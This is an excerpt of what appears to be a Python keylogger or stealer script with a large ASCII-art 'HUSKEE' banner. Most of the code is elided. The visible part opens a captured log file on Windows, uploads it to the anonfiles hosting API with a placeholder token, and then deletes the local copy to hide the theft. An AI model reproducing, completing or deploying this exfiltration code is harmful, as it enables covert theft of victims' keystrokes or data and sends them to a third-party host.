...
88        88  88        88   ad88888ba   88      a8P   88888888888  88888888888  
88        88  88        88  d8"     "8b  88    ,88'    88           88           
88        88  88        88  Y8,          88  ,88"      88           88           
88aaaaaaaa88  88        88  `Y8aaaaa,    88,d88'       88aaaaa      88aaaaa      
88""""""""88  88        88    `"""""8b,  8888"88,      88"""""      88"""""      
88        88  88        88          `8b  88P   Y8b     88           88           
88        88  Y8a.    .a8P  Y8a     a8P  88     "88,   88           88           
88        88   `"Y8888Y"'    "Y88888P"   88       Y8b  88888888888  88888888888  
...
if os.name == "nt":
 ...
 with open("logggg.fg", "rb") as ff:
    ...
    response = requests.post("https://api.anonfiles.com/upload?token=Tu token de anonfiles", files=files)
 cls()
 print(response)
 print("Finalizado...")
 os.remove("logggg.fg")